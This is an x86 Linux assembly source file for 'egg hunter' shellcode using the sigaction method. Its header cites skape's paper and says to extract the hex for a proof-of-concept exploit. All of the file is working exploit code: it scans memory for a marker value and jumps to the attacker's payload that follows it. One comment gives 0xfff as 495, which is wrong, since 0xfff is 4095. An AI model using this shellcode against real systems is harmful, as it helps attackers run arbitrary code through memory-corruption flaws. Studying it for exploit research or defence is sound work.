; Content:	egg_hunter via sigaction method -> http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
; Author: 	Florian Hansemann | @HanseSecure | https://hansesecure.de
; Date: 	09/2017
;
;
; For testing extract hexcode from this file and use it poc.c for eggHunting
;
;

global _start

_start:

align_page:
    or cx,0xfff         ; ecx			= 495 (PAGESIZE for counter)
next_address:
    inc ecx		
    push byte +0x43     ; push 67 on stack
    pop eax             ; eax			= 67 (sigaction)
    int 0x80            ; exec sigaction
    cmp al,0xf2         ; check if efault (return value 242) happened
    jz align_page       ; if efault occurs:	try next page
    mov eax, 0x50905090 ; if not: eax 		= 0x50905090 (EGG)
    mov edi, ecx        ; validated register/ address
    scasd               ; check every eax against edi and increment by 4 bytes
    jnz next_address    ; if not: 		try next address
    scasd               ; if match occurs:	check mathch in second half
    jnz next_address    ; if not: no match:	try next address
    jmp edi             ; if match occurs:	BINGO! EGG -> jump to evilPayload ;-)

